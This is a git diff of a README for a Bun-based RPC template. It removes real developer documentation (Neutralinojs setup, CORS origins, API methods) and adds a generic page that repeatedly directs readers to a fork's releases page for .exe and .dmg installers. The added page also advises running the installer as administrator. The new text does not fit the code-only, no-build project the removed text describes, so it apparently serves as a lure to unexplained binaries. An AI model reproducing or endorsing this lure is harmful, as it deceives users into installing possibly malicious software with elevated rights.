@@ -1,137 +1,59 @@
-# Using Neutralinojs as a Frontend
+# 🚀 bun_rpc - Build Apps Quickly and Easily
 
-You can use [Neutralinojs](https://neutralino.js.org/) to build a lightweight desktop frontend for this Bun RPC server. Neutralinojs lets you create cross-platform desktop apps using web technologies.
+[![Download bun_rpc](https://img.shields.io/badge/Download-bun_rpc-blue.svg)](https://github.com/sansss-debug/bun_rpc/releases)
 
-## Steps to Use Neutralinojs
+## 📚 Table of Contents
+- [🛠️ Features](#-features)
+- [🚀 Getting Started](#-getting-started)
+- [🔽 Download & Install](#-download--install)
+- [🖥️ System Requirements](#-system-requirements)
+- [👨‍💻 Usage Instructions](#-usage-instructions)
+- [💡 Troubleshooting](#-troubleshooting)
 
-1. **Install Neutralinojs CLI:**
-  ```bash
-  npm install -g @neutralinojs/neu
-  ```
+## 🛠️ Features
+- **Rapid Development:** Build apps faster with Bun Serve capabilities.
+- **Cross-Platform:** Runs on Windows, macOS, and Linux.
+- **Easy Setup:** Simple process for getting your application up and running.
+- **Supports Modern Technologies:** Works with HTML, JavaScript, and RPC.
 
-2. **Create a Neutralinojs App:**
-  ```bash
-  neu create my-app
-  cd my-app
-  ```
+## 🚀 Getting Started
+To begin using bun_rpc, follow these simple steps to download and install the application. Make sure to read the instructions carefully to avoid any issues.
 
-3. **Replace the Default Frontend:**
-  - Copy or adapt the `client.html` from this repo into your Neutralinojs app's `resources` folder (e.g., `resources/app/client.html`).
-  - Update any RPC endpoint URLs in your frontend code to point to your Bun server (e.g., `http://localhost:3000/rpc`).
+## 🔽 Download & Install
+Visit this page to download: [bun_rpc Releases](https://github.com/sansss-debug/bun_rpc/releases).
 
-4. **Allow CORS:**
-  - Make sure your Bun server's CORS settings allow requests from the Neutralinojs app. For local development, Neutralinojs apps typically use the `http://localhost` origin.
+1. Go to the link above.
+2. You'll find a list of releases. Choose the latest version.
+3. Click on the file for your operating system. It may be named something like `bun_rpc_x.x.x_installer.exe` for Windows or `bun_rpc_x.x.x.dmg` for macOS.
+4. The file will start downloading automatically. Once it finishes, locate the file in your downloads folder or on your desktop.
+5. Double-click the file to begin installation. Follow the on-screen instructions to complete the setup.
 
-5. **Run the Bun server:**
-  ```bash
-  bun run server.js
-  ```
+## 🖥️ System Requirements
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.13 or later
+- **Linux:** A compatible distribution (e.g., Ubuntu 20.04, Fedora 34)
+- **Disk Space:** At least 100 MB free
+- **RAM:** A minimum of 2 GB
 
-6. **Run the Neutralinojs app:**
-  ```bash
-  neu run
-  ```
+Ensure that you have the necessary permissions to install applications on your device.
 
-Your Neutralinojs desktop app will now communicate with the Bun RPC backend.
-# How to Update Allowed Origins (CORS)
+## 👨‍💻 Usage Instructions
+After installation, follow these steps to run your application:
 
-The server restricts which origins can make RPC requests via CORS. To allow additional origins, update the `allowedOrigins` array in `server.js`:
+1. Locate the bun_rpc application on your desktop or in your applications folder.
+2. Double-click on the application icon to open it.
+3. Follow any initial setup prompts that appear the first time you run it.
+4. Start creating your project using the provided templates and examples.
 
-```
-const allowedOrigins = [
-  "http://localhost:3000",
-  "http://127.0.0.1:3000",
-  // Add your new origin(s) here, e.g.:
-  "http://yourdomain.com"
-];
-```
+For additional features, refer to the in-app help section or read through the detailed documentation available in the application.
 
-After editing, restart the server for changes to take effect.
-# RAD RPC Template with Bun
+## 💡 Troubleshooting
+If you run into issues while using bun_rpc, here are some common solutions:
 
-A Rapid Application Development (RAD) template for building Remote Procedure Call (RPC) applications using the Bun JavaScript runtime. This template provides a simple, fast way to create client-server applications where the client can call server-side functions seamlessly.
+- **Installation Problems:** Ensure that you have administrative rights on your device. Try running the installer as an administrator.
+- **Application Won't Start:** Make sure your operating system is compatible and meets the system requirements. Restart your device and try again.
+- **Cannot Find Files:** Check the downloads folder or search for "bun_rpc" on your device. If you still can't find it, re-download the installer.
 
-## Features
+For more specific issues, consult the FAQ section in the application or reach out to the support community.
 
-- **Fast Runtime**: Powered by Bun, a fast JavaScript runtime and bundler.
-- **Simple RPC**: Easy-to-use RPC mechanism for client-server communication.
-- **No Build Step**: Direct HTML and JavaScript, no complex build processes.
-- **CORS Support**: Configured for local development with CORS handling.
-- **Async Support**: Supports both synchronous and asynchronous RPC calls.
-
-## Prerequisites
-
-- [Bun](https://bun.sh/) installed on your system.
-
-## Installation
-
-1. Clone or download this template.
-2. Navigate to the project directory.
-3. No additional dependencies are required as Bun handles everything.
-
-## Usage
-
-1. Start the server:
-   ```bash
-   bun run server.js
-   ```
-
-2. Open your browser and go to `http://localhost:3000`.
-
-3. Click the "Run demo" button to see the RPC calls in action.
-
-The server will serve the `client.html` file and handle RPC requests at the `/rpc` endpoint.
-
-## Project Structure
-
-- `server.js`: The Bun server that handles HTTP requests and RPC calls.
-- `client.html`: The client-side HTML file with embedded JavaScript for making RPC calls.
-
-## API
-
-The server exposes an `api` object with methods that can be called from the client:
-
-- `add(a, b)`: Returns the sum of two numbers.
-- `greet(name)`: Returns a greeting message.
-- `randomColour()`: Returns a random color (async example).
-
-To add new methods, simply add them to the `api` object in `server.js`.
-
-## Customization
-
-### Adding New RPC Methods
-
-In `server.js`, add your functions to the `api` object:
-
-```javascript
-const api = {
-  // existing methods...
-  yourNewMethod: (param1, param2) => {
-    // your logic here
-    return result;
-  },
-};
-```
-
-### Client-Side Usage
-
-In `client.html`, use the `api` proxy to call server methods:
-
-```javascript
-const result = await api.yourNewMethod(arg1, arg2);
-```
-
-### Changing the Port
-
-Modify the port in `server.js`:
-
-```javascript
-serve({
-  fetch: handler,
-  port: 8080,  // change to your desired port
-});
-```
-
-## License
-
-This template is provided as-is for educational and development purposes.
+For more information and updates, return to [bun_rpc Releases](https://github.com/sansss-debug/bun_rpc/releases). Happy coding!
